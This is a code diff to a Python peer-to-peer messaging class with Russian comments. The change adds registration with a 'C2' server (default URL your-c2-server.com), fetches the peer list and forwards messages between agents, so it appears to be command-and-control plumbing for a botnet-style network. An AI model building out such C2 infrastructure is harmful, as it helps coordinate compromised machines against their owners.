@@ -1,14 +1,33 @@
 import asyncio
 from shared.messages import Message
 from agents.crypto import encrypt, decrypt
+from agents.comms.discovery import register_with_c2, get_known_peers
+import socket
 
 class MeshComms:
-    def __init__(self, agent_id, listen_port, known_peers):
+    def __init__(self, agent_id, listen_port, bootstrap_url=None):
         self.agent_id = agent_id
         self.listen_port = listen_port
-        self.known_peers = known_peers  # agent_id -> (ip, port)
+        self.known_peers = {}  # agent_id -> (ip, port)
         self.message_handler = None
-        self.processed_msgs = set()  # msg_id для защиты от повторов
+        self.processed_msgs = set()
+        self.bootstrap_url = bootstrap_url or "http://your-c2-server.com:8000/api"
+
+    async def start(self):
+        # Получить внешний IP
+        ip = self._get_local_ip()
+        
+        # Зарегистрироваться на C2
+        register_with_c2(self.agent_id, ip, self.listen_port)
+        
+        # Получить известных пиров
+        peers = get_known_peers()
+        for peer in peers:
+            if peer["id"] != self.agent_id:
+                self.add_peer(peer["id"], peer["ip"], peer["port"])
+        
+        # Запустить сервер
+        await self.start_server()
 
     async def start_server(self):
         server = await asyncio.start_server(self.handle_conn, '0.0.0.0', self.listen_port)
@@ -23,7 +42,6 @@ class MeshComms:
             msg = Message.from_dict(decrypted_json)
 
             if msg.msg_id in self.processed_msgs:
-                # Повторное сообщение — игнорируем
                 writer.close()
                 await writer.wait_closed()
                 return
@@ -31,11 +49,9 @@ class MeshComms:
             self.processed_msgs.add(msg.msg_id)
 
             if msg.route[-1] == self.agent_id:
-                # Сообщение для нас
                 if self.message_handler:
                     await self.message_handler(msg.payload)
             else:
-                # Сообщение нужно переслать дальше
                 await self._proxy_forward(msg)
 
         except Exception as e:
@@ -92,3 +108,13 @@ class MeshComms:
         else:
             print(f"[{self.agent_id}] Обновлен peer: {peer_id} ({ip}:{port})")
         self.known_peers[peer_id] = (ip, port)
+
+    def _get_local_ip(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except Exception:
+            return "127.0.0.1"
